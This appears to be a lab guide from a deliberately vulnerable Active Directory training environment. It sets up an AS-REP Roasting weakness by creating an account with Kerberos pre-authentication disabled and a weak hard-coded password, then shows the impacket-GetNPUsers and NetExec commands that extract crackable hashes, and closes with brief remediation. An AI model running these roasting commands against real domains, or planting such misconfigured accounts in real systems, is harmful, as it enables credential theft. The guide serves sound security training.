# Vulnerability 02 - AS-REP Roasting

## Objective
Create a legacy account with Kerberos pre-authentication disabled.

## Configure on DC01

```powershell
$domain = "DC=hznlab,DC=local"
$legacyOU = "OU=Disabled Accounts,$domain"

New-ADUser `
  -Name "Legacy Application" `
  -SamAccountName "legacy_app" `
  -UserPrincipalName "legacy_app@hznlab.local" `
  -Description "Legacy application integration account" `
  -Path $legacyOU `
  -AccountPassword (ConvertTo-SecureString "Legacy2024!" -AsPlainText -Force) `
  -Enabled $true `
  -ChangePasswordAtLogon $false

Set-ADAccountControl `
  -Identity legacy_app `
  -DoesNotRequirePreAuth $true
```

Verify:

```powershell
Get-ADUser legacy_app `
  -Properties DoesNotRequirePreAuth,Enabled,Description |
  Select SamAccountName,Enabled,DoesNotRequirePreAuth,Description
```

## Validate from Kali

```bash
echo 'legacy_app' > asrep-users.txt

impacket-GetNPUsers \
  hznlab.local/ \
  -usersfile asrep-users.txt \
  -no-pass \
  -dc-ip 10.10.10.10 \
  -format hashcat \
  -outputfile asrep.txt
```

Expected:

```text
$krb5asrep$23$legacy_app@HZNLAB.LOCAL:...
```

Authenticated discovery:

```bash
nxc ldap 10.10.10.10 \
  -u jwilson \
  -p 'HznLab2026!' \
  --asreproast asrep-nxc.txt
```

## Remediation
Require Kerberos pre-authentication, remove stale integration accounts, and use strong rotated credentials.
